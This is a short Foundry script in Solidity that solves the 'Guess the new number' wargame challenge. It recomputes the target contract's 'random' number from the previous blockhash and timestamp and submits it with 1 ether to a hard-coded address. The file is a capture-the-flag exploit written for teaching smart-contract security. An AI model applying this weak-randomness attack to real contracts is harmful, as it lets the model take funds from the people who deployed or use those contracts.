// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/IGuessTheNewNumberChallenge.sol";

contract GuessTheNumberChallengeScript is Script {
    address private constant TARGET_ADDRESS = 0x2B15A7419Abbd7dc512a8b75A40e26ea767Bf3A7;
    IGuessTheNewNumberChallenge private target;

    function setUp() public {
        target = IGuessTheNewNumberChallenge(TARGET_ADDRESS);
    }

    function run() public {
        vm.startBroadcast();
        uint8 answer = uint8(
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))
        );
        (bool success, ) = TARGET_ADDRESS.call{value: 1 ether}(
            abi.encodeWithSignature("guess(uint8)", answer)
        );
        require(success, "Call:failed");
        require(target.isComplete(), "Challenge:incomplete");
        vm.stopBroadcast();
    }
}
